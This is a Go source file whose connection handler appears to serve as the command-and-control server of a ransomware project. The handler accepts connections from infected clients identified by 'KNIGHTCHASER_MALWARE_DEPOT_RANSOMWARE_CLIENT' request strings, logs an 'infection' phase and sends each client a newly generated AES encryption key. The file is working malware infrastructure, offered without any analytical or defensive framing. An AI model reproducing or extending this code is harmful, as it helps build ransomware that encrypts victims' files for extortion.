package utilities

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"
)

func HandleClientConnection(conn net.Conn) {
	defer func() {
		ClientConnectionLog(conn.RemoteAddr().String(), "Connection closed.")
		conn.Close()
	}()

	ClientConnectionLog(conn.RemoteAddr().String(), "Connection accepted.")

	// Read data from client
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		log.Panicf("Error reading: %v", err.Error())
	}

	// Process client request
	request := string(buffer[:n])
	response := ""

	switch request {
	case "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:ESTABLISHCONNECTION":
		response = "Connection established."
		ClientConnectionLog(conn.RemoteAddr().String(), "(Phase 1) Infectioning connection established.")
	case "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:GETENCRYPTIONKEY":
		cryptographicKey := GenerateAESKey()
		response = string(cryptographicKey)
		ClientConnectionLog(conn.RemoteAddr().String(), fmt.Sprintf("(Phase 2) Encryption key sent, key: %v", hex.EncodeToString(cryptographicKey)))
	default:
		response = "Unknown request."
		ClientConnectionLog(conn.RemoteAddr().String(), "Unknown request. (terminate session immediately)")
		return
	}

	// Send response to client
	_, err = conn.Write([]byte(response))
	if err != nil {
		log.Panicf("Error writing: %v", err.Error())
	}
}
